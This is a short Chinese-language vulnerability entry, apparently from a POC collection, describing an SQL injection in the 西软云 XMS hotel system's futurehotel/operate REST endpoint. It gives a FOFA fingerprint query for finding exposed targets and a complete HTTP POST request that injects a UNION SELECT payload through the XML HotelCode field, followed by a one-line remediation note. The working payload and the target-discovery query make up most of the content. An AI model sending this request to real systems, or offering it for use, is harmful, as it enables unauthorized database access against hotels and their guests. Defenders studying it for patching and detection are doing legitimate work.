# 西软云-operate-sql注入

# 影响版本

西软云

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="WebXMS" || body="西软云XMS"

POC/EXP：

```
POST /XopServerRS/rest/futurehotel/operate HTTP/1.1
Host: 127.0.0.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<UpdateRQ>
  <AuthenticationToken>
    <Token>test-token</Token>
  </AuthenticationToken>
  <TaoBaoOrderId>0</TaoBaoOrderId>
  <OrderId>ORD123</OrderId>
  <RequestID>REQ-123</RequestID>
  <HotelCode>H002' UNION ALL SELECT CONCAT(CONCAT('qbbjq','HwNO'),'qpzxq'),NULL-- PoVf</HotelCode>
  <OperateType>9</OperateType>
  <Action>0</Action>
  <DisplayText>Cancel invoice request</DisplayText>
  <Extensions/>
</UpdateRQ>
```

![image-20260813160207966](assets/image-20260813160207966.png)

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
